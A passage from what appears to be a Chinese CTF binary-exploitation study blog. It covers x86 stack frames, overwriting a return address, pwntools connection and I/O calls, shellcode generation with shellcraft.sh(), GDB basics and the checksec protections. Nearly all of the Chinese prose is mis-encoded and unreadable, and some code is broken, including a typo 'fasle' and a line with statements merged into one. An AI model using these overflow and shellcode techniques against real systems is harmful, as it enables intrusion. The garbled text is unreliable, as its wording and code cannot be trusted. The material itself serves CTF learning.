class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pushã€€ã€€ã€€    ebpã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€   ;ebpå…¥æ ˆã€€</span><br><span class="line">movã€€ã€€ã€€ã€€ ebp,ã€€espã€€ã€€ã€€ã€€ã€€ã€€    ;å› ä¸ºespæ˜¯å †æ ˆæŒ‡é’ˆï¼Œæ— æ³•æš‚å€Ÿä½¿ç”¨ï¼Œæ‰€ä»¥å¾—ç”¨ebpæ¥å­˜å–å †æ ˆã€€</span><br><span class="line">subã€€ã€€ã€€ã€€  esp,ã€€4*5ã€€ã€€ã€€ã€€ã€€ã€€ã€€  ;ä¸‹é¢çš„wsprintfä¸€å…±ä½¿ç”¨äº†5ä¸ªå‚æ•°ï¼Œæ¯ä¸ªå‚æ•°å ç”¨4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¦å…¥æ ˆ4*5ä¸ªå­—èŠ‚ã€€</span><br><span class="line">pushã€€ã€€ã€€ã€€1111ã€€</span><br><span class="line">pushã€€ã€€ã€€ã€€2222ã€€</span><br><span class="line">pushã€€ã€€ã€€ã€€3333ã€€</span><br><span class="line">pushã€€ã€€ã€€ã€€offsetã€€szFormatã€€</span><br><span class="line">pushã€€ã€€ã€€ã€€offsetã€€szOutã€€</span><br><span class="line">callã€€ã€€ã€€ã€€  wsprintfã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€  ;è°ƒç”¨wsprintfã€€</span><br><span class="line">addã€€ã€€ã€€ ã€€esp,ã€€4*5ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€;å †æ ˆä½¿ç”¨å®Œæ¯•ï¼Œâ€œè¿˜â€å›4*5ä¸ªå­—èŠ‚ç»™ç³»ç»Ÿã€€</span><br><span class="line">â€¦ã€€</span><br><span class="line">movã€€ã€€ã€€ã€€esp,ã€€ebpã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€;æ¢å¤espçš„å€¼ã€€</span><br><span class="line">popã€€ã€€ã€€ã€€ebpã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€;ebpå‡ºæ ˆã€€</span><br><span class="line">retã€€</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210726111256.png"></p><p>æ‰¾åˆ°äº†ï¼Œebp-xxxhæ˜¯æ•°ç»„åœ¨æ ˆä¸­çš„é«˜åº¦ï¼Œä¹Ÿå°±æ˜¯å¤§å°ã€‚esp+xxxhæ˜¯æ•°ç»„åœ¨æ ˆä¸­çš„ä½ç½®ï¼Œæ˜¯æ•°ç»„åˆ°espçš„è·ç¦»</p><p>å¦‚æœæ˜¯è¾“å…¥char çš„è¯ï¼Œå°±è¦†ç›–æ»¡char</p><p>ç„¶åè¦†ç›–ebp</p><p>ç„¶åä¿®æ”¹è¿”å›åœ°å€</p><p>è·³è½¬åˆ°ä½ æƒ³è¦è·³çš„åœ°æ–¹</p><h4 id="å‡½æ•°å®Œæ•´çš„è°ƒç”¨ï¼Œè¿”å›è¿‡ç¨‹"><a href="#å‡½æ•°å®Œæ•´çš„è°ƒç”¨ï¼Œè¿”å›è¿‡ç¨‹" class="headerlink" title="å‡½æ•°å®Œæ•´çš„è°ƒç”¨ï¼Œè¿”å›è¿‡ç¨‹"></a>å‡½æ•°å®Œæ•´çš„è°ƒç”¨ï¼Œè¿”å›è¿‡ç¨‹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨è€…ï¼š</span><br><span class="line">push è°ƒç”¨å‚æ•°</span><br><span class="line">call å‡½æ•°ï¼ˆpush eip ï¼›jmp swapï¼‰</span><br><span class="line"></span><br><span class="line">è¢«è°ƒç”¨è€…ï¼š</span><br><span class="line">push ebp ï¼ˆå­˜è°ƒç”¨è€…çš„ebpï¼‰</span><br><span class="line">mov ebp,esp ï¼ˆå¼€è¾Ÿæ ˆç©ºé—´ï¼‰</span><br><span class="line">sub esp,4 # sub espï¼Œ4 çš„4ä¸æ˜¯å®šå€¼ï¼Œçœ‹éœ€æ±‚</span><br><span class="line"></span><br><span class="line">è¢«è°ƒç”¨è€…</span><br><span class="line">leaveï¼ˆmov esp,ebp ;  pop ebpï¼‰</span><br><span class="line">ret (pop eip)</span><br><span class="line"></span><br><span class="line">è°ƒç”¨è€…</span><br><span class="line">add esp,xxx ï¼ˆå°†è¢«è°ƒç”¨è€…çš„å‚æ•°å¼¹å‡ºï¼Œå¹³æ ˆï¼‰</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="pwntoolsä½¿ç”¨"><a href="#pwntoolsä½¿ç”¨" class="headerlink" title="pwntoolsä½¿ç”¨"></a>pwntoolsä½¿ç”¨</h3><p>å­¦ä¹ ç½‘å€ï¼š</p><p><a href="https://www.jianshu.com/p/6e528b33e37a">https://www.jianshu.com/p/6e528b33e37a</a></p><p><a href="https://zhuanlan.zhihu.com/p/83373740">https://zhuanlan.zhihu.com/p/83373740</a></p><h4 id="è¿æ¥æ–¹å¼"><a href="#è¿æ¥æ–¹å¼" class="headerlink" title="è¿æ¥æ–¹å¼"></a>è¿æ¥æ–¹å¼</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¬¬ä¸€ç§è¿æ¥æ–¹å¼ï¼Œé€šè¿‡ipå’Œportå»è¿æ¥</span></span><br><span class="line">conn = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>)  </span><br><span class="line"><span class="comment"># ç¬¬äºŒç§è¿æ¥æ–¹å¼ï¼Œé€šè¿‡sshè¿æ¥</span></span><br><span class="line">shell = ssh(host=<span class="string">&#x27;192.168.14.144&#x27;</span>, user=<span class="string">&#x27;root&#x27;</span>, port=<span class="number">2222</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure><p>IOæ¨¡å—ï¼šè¿™ä¸ªæ¯”è¾ƒå®¹æ˜“è·Ÿzioææ··ï¼Œè®°ä½zioæ˜¯readã€writeï¼Œpwnæ˜¯recvã€send</p><p>å­¦ä¹ ç½‘å€ï¼š</p><p><a href="https://blog.csdn.net/weixin_45556441/article/details/114166906">https://blog.csdn.net/weixin_45556441/article/details/114166906</a></p><p>ä¸€ã€context<br>context æ˜¯ pwntools ç”¨æ¥è®¾ç½®ç¯å¢ƒçš„åŠŸèƒ½ã€‚åœ¨å¾ˆå¤šæ—¶å€™ï¼Œç”±äºäºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸åŒï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦è¿›è¡Œä¸€äº›ç¯å¢ƒè®¾ç½®æ‰èƒ½å¤Ÿæ­£å¸¸è¿è¡Œexpï¼Œæ¯”å¦‚æœ‰ä¸€äº›éœ€è¦è¿›è¡Œæ±‡ç¼–ï¼Œä½†æ˜¯32çš„æ±‡ç¼–å’Œ64çš„æ±‡ç¼–ä¸åŒï¼Œå¦‚æœä¸è®¾ç½®contextä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ã€‚</p><p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬è®¾ç½®contextåªéœ€è¦ç®€å•çš„ä¸€å¥è¯:</p><p>context(os=â€™linuxâ€™, arch=â€™amd64â€™, log_level=â€™debugâ€™)</p><p>æˆ–è€… context(os=â€™linuxâ€™, arch=â€™amd64â€™)</p><p>è¿™å¥è¯çš„æ„æ€æ˜¯ï¼š</p><ol><li>osè®¾ç½®ç³»ç»Ÿä¸ºlinuxç³»ç»Ÿï¼Œåœ¨å®Œæˆctfé¢˜ç›®çš„æ—¶å€™ï¼Œå¤§å¤šæ•°pwné¢˜ç›®çš„ç³»ç»Ÿéƒ½æ˜¯linux</li><li>archè®¾ç½®æ¶æ„ä¸ºamd64ï¼Œå¯ä»¥ç®€å•çš„è®¤ä¸ºè®¾ç½®ä¸º64ä½çš„æ¨¡å¼ï¼Œå¯¹åº”çš„32ä½æ¨¡å¼æ˜¯â€™i386â€™</li><li>log_levelè®¾ç½®æ—¥å¿—è¾“å‡ºçš„ç­‰çº§ä¸ºdebugï¼Œè¿™å¥è¯åœ¨è°ƒè¯•çš„æ—¶å€™ä¸€èˆ¬ä¼šè®¾ç½®ï¼Œè¿™æ ·pwntoolsä¼šå°†å®Œæ•´çš„ioè¿‡ç¨‹éƒ½æ‰“å°ä¸‹æ¥ï¼Œä½¿å¾—è°ƒè¯•æ›´åŠ æ–¹ä¾¿ï¼Œå¯ä»¥é¿å…åœ¨å®ŒæˆCTFé¢˜ç›®æ—¶å‡ºç°ä¸€äº›å’ŒIOç›¸å…³çš„é”™è¯¯ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>1<br>2<br>3<br>4<br>äºŒã€æ±‡ç¼–ä¸shellcode<br>æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨å†™expçš„æ—¶å€™ç”¨åˆ°ç®€å•çš„shellcodeï¼Œpwntoolsæä¾›äº†å¯¹ç®€å•çš„shellcodeçš„æ”¯æŒã€‚<br>é¦–å…ˆï¼Œå¸¸ç”¨çš„ï¼Œä¹Ÿæ˜¯æœ€ç®€å•çš„shellcodeï¼Œå³è°ƒç”¨/bin/sh</li></ol><p>è¯­å¥: shellcode = asm(shellcraft.sh())</p><p>print(asm(shellcraft.sh())) # æ‰“å°å‡ºæ±‡ç¼–åçš„shellcode<br>1<br>æ³¨æ„ï¼Œç”±äºå„ä¸ªå¹³å°ï¼Œç‰¹åˆ«æ˜¯32ä½å’Œ64ä½çš„shellcodeä¸ä¸€æ ·ï¼Œæ‰€ä»¥æœ€å¥½å…ˆè®¾ç½®contextã€‚asmä¹Ÿæ˜¯æ¶æ„ç›¸å…³ï¼Œæ‰€ä»¥ä¸€å®šè¦å…ˆè®¾ç½®contextï¼Œé¿å…ä¸€äº›æ„æƒ³ä¸åˆ°çš„é”™è¯¯ã€‚</p><p>ä½¿ç”¨æ–¹æ³•å³:</p><p>context(os=â€™linuxâ€™, arch=â€™amd64(i386)â€™)</p><p>shellcode = asm(shellcraft.sh())</p><p>p.sendline(shellcode)</p><h4 id="å‘é€å’Œæ¥å—æ•°æ®"><a href="#å‘é€å’Œæ¥å—æ•°æ®" class="headerlink" title="å‘é€å’Œæ¥å—æ•°æ®"></a>å‘é€å’Œæ¥å—æ•°æ®</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">send(<span class="keyword">data</span>): å‘é€æ•°æ®</span><br><span class="line">sendline(<span class="keyword">data</span>) : å‘é€ä¸€è¡Œæ•°æ®ï¼Œç›¸å½“äºåœ¨æœ«å°¾åŠ \n      </span><br><span class="line">recv(numb=<span class="number">4096</span>, timeout=default) : ç»™å‡ºæ¥æ”¶å­—èŠ‚æ•°,timeoutæŒ‡å®šè¶…æ—¶</span><br><span class="line">recvuntil(delims, drop=False) : æ¥æ”¶åˆ°delimsçš„pattern</span><br><span class="line">ï¼ˆä»¥ä¸‹å¯ä»¥çœ‹ä½œuntilçš„ç‰¹ä¾‹ï¼‰</span><br><span class="line">recvline(keepends=True) : æ¥æ”¶åˆ°\nï¼ŒkeependsæŒ‡å®šä¿ç•™\n</span><br><span class="line">recvall() : æ¥æ”¶åˆ°EOF</span><br><span class="line">recvrepeat(timeout=default) : æ¥æ”¶åˆ°EOFæˆ–timeout</span><br><span class="line">interactive() : ä¸shelläº¤äº’</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">conn.send(<span class="keyword">data</span>) #å‘é€æ•°æ®</span><br><span class="line">conn.sendline(<span class="keyword">data</span>) #å‘é€ä¸€è¡Œæ•°æ®ï¼Œç›¸å½“äºåœ¨æ•°æ®åé¢åŠ \n</span><br><span class="line">#æ¥æ”¶æ•°æ®ï¼Œnumbåˆ¶å®šæ¥æ”¶çš„å­—èŠ‚ï¼ŒtimeoutæŒ‡å®šè¶…æ—¶</span><br><span class="line">conn.recv(numb = <span class="number">2048</span>, timeout = default)</span><br><span class="line">#æ¥å—ä¸€è¡Œæ•°æ®ï¼Œkeependsä¸ºæ˜¯å¦ä¿ç•™è¡Œå°¾çš„\n</span><br><span class="line">conn.recvline(keepends=True)</span><br><span class="line">#æ¥å—æ•°æ®ç›´åˆ°æˆ‘ä»¬è®¾ç½®çš„æ ‡å¿—å‡ºç°</span><br><span class="line">conn.recvuntil(<span class="string">&quot;Hello,World\n&quot;</span>,drop=fasle) </span><br><span class="line">conn.recvall()  #ä¸€ç›´æ¥æ”¶ç›´åˆ° EOF</span><br><span class="line">conn.recvrepeat(timeout = default)  #æŒç»­æ¥å—ç›´åˆ°EOFæˆ–timeout</span><br><span class="line">#ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œç›¸å½“äºå›åˆ°shellçš„æ¨¡å¼ï¼Œåœ¨å–å¾—shellä¹‹åä½¿ç”¨</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h4 id="ELFæ¨¡å—"><a href="#ELFæ¨¡å—" class="headerlink" title="ELFæ¨¡å—"></a>ELFæ¨¡å—</h4><p>è·å–åŸºåœ°å€ã€è·å–å‡½æ•°åœ°å€ï¼ˆåŸºäºç¬¦å·ï¼‰ã€è·å–å‡½æ•°gotåœ°å€ã€è·å–å‡½æ•°pltåœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> hex(e.address)  <span class="comment"># æ–‡ä»¶è£…è½½çš„åŸºåœ°å€</span></span><br><span class="line">0x400000</span><br><span class="line"><span class="built_in">print</span> hex(e.symbols[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># å‡½æ•°åœ°å€</span></span><br><span class="line">0x401680</span><br><span class="line"><span class="built_in">print</span> hex(e.got[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># GOTè¡¨çš„åœ°å€</span></span><br><span class="line">0x60b070</span><br><span class="line"><span class="built_in">print</span> hex(e.plt[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># PLTçš„åœ°å€</span></span><br><span class="line">0x401680</span><br></pre></td></tr></table></figure><h4 id="æ±‡ç¼–ä¸åæ±‡ç¼–"><a href="#æ±‡ç¼–ä¸åæ±‡ç¼–" class="headerlink" title="æ±‡ç¼–ä¸åæ±‡ç¼–"></a>æ±‡ç¼–ä¸åæ±‡ç¼–</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;mov eax, 0&#x27;</span>)   <span class="comment">#æ±‡ç¼–</span></span><br><span class="line"><span class="string">&#x27;\xb8\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(<span class="string">&#x27;\xb8\x0b\x00\x00\x00&#x27;</span>)  <span class="comment">#åæ±‡ç¼–</span></span><br><span class="line"><span class="string">&#x27;   0:   b8 0b 00 00 00          mov    eax,0xb&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="shellcodeç”Ÿæˆ"><a href="#shellcodeç”Ÿæˆ" class="headerlink" title="shellcodeç”Ÿæˆ"></a>shellcodeç”Ÿæˆ</h4><p><strong>pwnlib.shellcraftæ¨¡å—</strong>åŒ…å«<strong>ç”Ÿæˆshellä»£ç </strong>çš„å‡½æ•°ã€‚<br>å…¶ä¸­çš„å­æ¨¡å—å£°æ˜ç»“æ„ï¼Œæ¯”å¦‚</p><ul><li>ARMæ¶æ„: shellcraft.arm</li><li>AMD64æ¶æ„: shellcraft.amd64</li><li>Intel 80386æ¶æ„: shellcraft.i386</li><li>é€šç”¨: shellcraft.common</li></ul><p>å¯ä»¥<strong>é€šè¿‡contextè®¾ç½®æ¶æ„</strong>ï¼Œç„¶å<strong>ç”Ÿæˆshellcode</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p><strong>è°ƒç”¨gdbè°ƒè¯•</strong> åœ¨pythonæ–‡ä»¶ä¸­ç›´æ¥è®¾ç½®æ–­ç‚¹ï¼Œå½“è¿è¡Œåˆ°è¯¥ä½ç½®ä¹‹åå°±ä¼šæ–­ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./c&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure><h4 id="è§£é¢˜å¸¸ç”¨ï¼š"><a href="#è§£é¢˜å¸¸ç”¨ï¼š" class="headerlink" title="è§£é¢˜å¸¸ç”¨ï¼š"></a>è§£é¢˜å¸¸ç”¨ï¼š</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>   <span class="comment">//è®¾ç½®æ¶æ„context.log_level = &#x27;debug&#x27; //æ˜¾ç¤ºlogè¯¦ç»†ä¿¡æ¯libc = ELF(&#x27;./libc-2.24.so&#x27;)  //åŠ è½½åº“æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h3 id="GDBæ“ä½œ"><a href="#GDBæ“ä½œ" class="headerlink" title="GDBæ“ä½œ"></a>GDBæ“ä½œ</h3><p>å­¦ä¹ ç½‘å€ï¼š</p><p><a href="https://blog.csdn.net/chen1415886044/article/details/105094688/">https://blog.csdn.net/chen1415886044/article/details/105094688/</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g main.c -o main</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722160634.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>è®¾ç½®æ–­ç”µ</strong></p><p>break [è¡Œå·]</p><p>b [å‡½æ•°å]</p><p>break test.c:6 if num&gt;0</p><p>å½“åœ¨num&gt;0æ—¶ï¼Œç¨‹åºå°†ä¼šåœ¨ç¬¬6è¡Œæ–­ä½ã€‚</p><p><strong>æŸ¥çœ‹æ–­ç‚¹</strong></p><p>info breakpoints</p><p><strong>åˆ é™¤æ–­ç‚¹</strong></p><p>delete breakpoint</p><p>æ¯”å¦‚ delete 1</p><h3 id="checksecå«ä¹‰"><a href="#checksecå«ä¹‰" class="headerlink" title="checksecå«ä¹‰"></a>checksecå«ä¹‰</h3><p>å­¦ä¹ ç½‘å€ï¼š</p><p><a href="https://www.jianshu.com/p/6e528b33e37a">https://www.jianshu.com/p/6e528b33e37a</a></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722184517.png" alt="image-20210722184219109"></p><p>é˜²æŠ¤æŠ€æœ¯ï¼š</p><p><strong>RELRO</strong>:åœ¨Linuxç³»ç»Ÿå®‰å…¨é¢†åŸŸæ•°æ®å¯ä»¥å†™çš„å­˜å‚¨åŒºå°±ä¼šæ˜¯æ”»å‡»çš„ç›®æ ‡ï¼Œå°¤å…¶æ˜¯å­˜å‚¨å‡½æ•°æŒ‡é’ˆçš„åŒºåŸŸï¼Œå°½é‡å‡å°‘å¯å†™çš„å­˜å‚¨åŒºåŸŸå¯ä½¿å®‰å…¨ç³»æ•°æé«˜ã€‚GCC, GNU linkerä»¥åŠGlibc-dynamic linkerä¸€èµ·é…åˆå®ç°äº†ä¸€ç§å«åšrelroçš„æŠ€æœ¯Relocation Read Only, é‡å®šå‘åªè¯»ï¼Œå®ç°å°±æ˜¯ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯»ã€‚ï¼ˆå‚è€ƒ<a href="https://link.jianshu.com/?t=https://hardenedlinux.github.io/2016/11/25/RelRO.html">RELROæŠ€æœ¯ç»†èŠ‚</a>ï¼‰</p><p><strong>Stack</strong>: æ ˆæº¢å‡ºæ£€æŸ¥ï¼Œç”¨<strong>Canaryé‡‘ä¸é›€å€¼</strong>æ˜¯å¦å˜åŒ–æ¥æ£€æµ‹,Canary foundè¡¨ç¤ºå¼€å¯ã€‚</p><p>é‡‘ä¸é›€æœ€æ—©æŒ‡çš„æ˜¯çŸ¿å·¥æ›¾åˆ©ç”¨é‡‘ä¸é›€æ¥ç¡®è®¤æ˜¯å¦æœ‰æ°”ä½“æ³„æ¼ï¼Œå¦‚æœé‡‘ä¸é›€å› ä¸ºæ°”ä½“æ³„æ¼è€Œä¸­æ¯’æ­»äº¡ï¼Œå¯ä»¥ç»™çŸ¿å·¥é¢„è­¦ã€‚è¿™é‡Œæ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼šå¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxå°†cookieä¿¡æ¯ç§°ä¸ºCanaryã€‚</p><p><strong>NX</strong>: No Executeï¼Œæ ˆä¸å¯æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯windowsä¸Šçš„DEPã€‚</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722184605.png" alt="image-20210722184605404"></p><p>DEP</p><blockquote><p>åˆ†æç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Œå…¶æ ¹æºåœ¨äºç°ä»£è®¡ç®—æœºå¯¹æ•°æ®å’Œä»£ç æ²¡æœ‰æ˜ç¡®åŒºåˆ†è¿™ä¸€å…ˆå¤©ç¼ºé™·ï¼Œå°±ç›®å‰æ¥çœ‹é‡æ–°å»è®¾è®¡è®¡ç®—æœºä½“ç³»ç»“æ„åŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘ä»¬åªèƒ½é å‘å‰å…¼å®¹çš„ä¿®è¡¥æ¥å‡å°‘æº¢å‡ºå¸¦æ¥çš„æŸå®³ï¼ŒDEPå°±æ˜¯ç”¨æ¥å¼¥è¡¥è®¡ç®—æœºå¯¹æ•°æ®å’Œä»£ç æ··æ·†è¿™ä¸€å¤©ç„¶ç¼ºé™·çš„ã€‚</p></blockquote><p>DEPçš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚DEPçš„ä¸»è¦ä½œç”¨æ˜¯é˜»æ­¢æ•°æ®é¡µï¼ˆå¦‚é»˜è®¤çš„å †é¡µã€å„ç§å †æ ˆé¡µä»¥åŠå†…å­˜æ± é¡µï¼‰æ‰§è¡Œä»£ç ã€‚ç¡¬ä»¶DEPéœ€è¦CPUçš„æ”¯æŒï¼ŒAMDå’ŒInteléƒ½ä¸ºæ­¤åšäº†è®¾è®¡ï¼ŒAMDç§°ä¹‹ä¸ºNo-Execute Page-Protectionï¼ˆNXï¼‰ï¼ŒIntelç§°ä¹‹ä¸ºExecute Disable Bitï¼ˆXDï¼‰</p><p>Linuxç§°ä¸º NX ä¸ DEPåŸç†ç›¸åŒ</p><p><strong>PIE</strong>: position-independent executables, ä½ç½®æ— å…³çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„ASLR(Address space layout randomization) åœ°å€éšæœºåŒ–ï¼Œç¨‹åºæ¯æ¬¡å¯åŠ¨åŸºå€éƒ½éšæœºã€‚</p><hr><p>å­¦ä¹ ç½‘å€ï¼š<a href="http://blog.wjhwjhn.com/archives/45/">http://blog.wjhwjhn.com/archives/45/</a></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722184221.png" alt="image-20210722184219109"></p><p>1.Relro<br>Relocation Read Onlyï¼Œ é‡å®šä½è¡¨åªè¯»ã€‚é‡å®šä½è¡¨å³.got å’Œ.plt ä¸¤ä¸ªè¡¨ã€‚<br>NO RELROï¼š å¯ä»¥å†™.dynamicï¼Œç°åœ¨çš„è½¯ä»¶ä¸å¸¸è§ï¼Œå¦‚æœæ˜¯è¿™ä¸ªé€‰é¡¹å¾ˆæœ‰å¯èƒ½æ˜¯ä¸€ç§å¯¹è€ƒç‚¹çš„æš—ç¤ºã€‚<br>Partial RELROï¼š .dynamic åªè¯»ï¼Œæ¯”è¾ƒå¸¸è§ï¼Œå¯ä»¥ä¿®æ”¹ got è¡¨å†…å®¹ã€‚<br>Full RELROï¼šæ— æ³•åˆ©ç”¨ GOT è¡¨è¿›è¡Œæ”»å‡»ã€‚</p><h2 id="2-Stack"><a href="#2-Stack" class="headerlink" title="2.Stack"></a>2.Stack</h2><p>ä¸€èˆ¬ç”± <strong>Canary (é‡‘ä¸é›€)</strong> æ¥ä¿æŠ¤ï¼Œé‡‘ä¸é›€åŸæ¥æ˜¯çŸ³æ²¹å·¥äººç”¨æ¥åˆ¤æ–­æ°”ä½“æ˜¯å¦æœ‰æ¯’ã€‚è€Œåº”ç”¨äºåœ¨æ ˆä¿æŠ¤ä¸Šåˆ™æ˜¯åœ¨åˆå§‹åŒ–ä¸€ä¸ªæ ˆå¸§æ—¶åœ¨æ ˆåº•ï¼ˆ<strong>stack overflow</strong> å‘ç”Ÿçš„é«˜ä½åŒºåŸŸçš„å°¾éƒ¨ï¼‰è®¾ç½®ä¸€ä¸ªéšæœºçš„ <strong>canary</strong> å€¼ï¼Œå½“å‡½æ•°è¿”å›ä¹‹æ—¶æ£€æµ‹ <strong>canary</strong> çš„å€¼æ˜¯å¦ç»è¿‡äº†æ”¹å˜ï¼Œä»¥æ­¤æ¥åˆ¤æ–­ <strong>stack/buffer overflow</strong> æ˜¯å¦å‘ç”Ÿï¼Œè‹¥æ”¹å˜åˆ™è¯´æ˜æ ˆæº¢å‡ºå‘ç”Ÿï¼Œç¨‹åºè§¦å‘ <strong>stack_chk_fail</strong> å‡½æ•°é€€å‡ºç¨‹åºã€‚ æ³¨æ„ï¼šåŒä¸€ä¸ªç¨‹åºçš„ <strong>canary</strong> çš„å€¼éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè€Œä¸”å­è¿›ç¨‹ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚<br>å› æ­¤æˆ‘ä»¬éœ€è¦è·å– <strong>Canary</strong> çš„å€¼ï¼Œæˆ–è€…é˜²æ­¢è§¦å‘ <strong>stack_chk_fail</strong> å‡½æ•°ã€‚<br>å› ä¸º <strong>Canary</strong> 